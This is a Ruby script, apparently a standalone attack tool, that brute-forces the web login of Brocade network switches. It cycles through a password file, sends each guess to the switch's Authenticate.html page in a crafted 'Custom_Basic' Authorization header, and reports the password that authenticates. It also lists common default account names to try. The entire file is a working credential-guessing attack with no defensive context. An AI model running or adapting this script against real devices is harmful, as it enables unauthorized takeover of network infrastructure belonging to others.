#!/usr/bin/ruby
# Brocade Switch Brute Forcer
# @ndrix
require 'net/http'
require 'base64'

def usage
  puts "#{$0} <url> <login> passwords.txt"
	puts "<login> is usually root, admin, user or factory"
  exit
end

usage if ARGV.length < 3
uri = URI.parse(ARGV.first)
rand = 0

# get the arguments
http = Net::HTTP.new(uri.host, uri.port)
req = Net::HTTP::Get.new("/Authenticate.html?page=/switchExplorer.html")
req["User-Agent"] = "WebTools"
req["Cache-Control"] = "no-cache"
req["Connection"] = "keep-alive"
file = File.open(ARGV[2])
puts " + going to try #{file.readlines.size} passwords"
counter = 0
File.open(ARGV[2]).each do |password|
	counter += 1
  password.chomp!
	auth = "#{ARGV[1]}:#{password}:#{3000000000+rand(999999999)}"
	req["Authorization"] = "Custom_Basic #{Base64.encode64(auth).chomp}"
  resp = http.request(req)
	if resp.code.eql?("200")
		response_lines = resp.body.split("\n")
		if response_lines[9].eql?("authenticated = no")
			print "."; $stdout.flush
		else
			puts "\nFound it! : #{password}"
			exit
		end
	else
		puts " ! something went wrong, we got a http code #{resp.code}"
	end
	print " #{counter}\n" if (counter % 50).eql?(0)
end
puts "\n + all done, we didn't find anything."
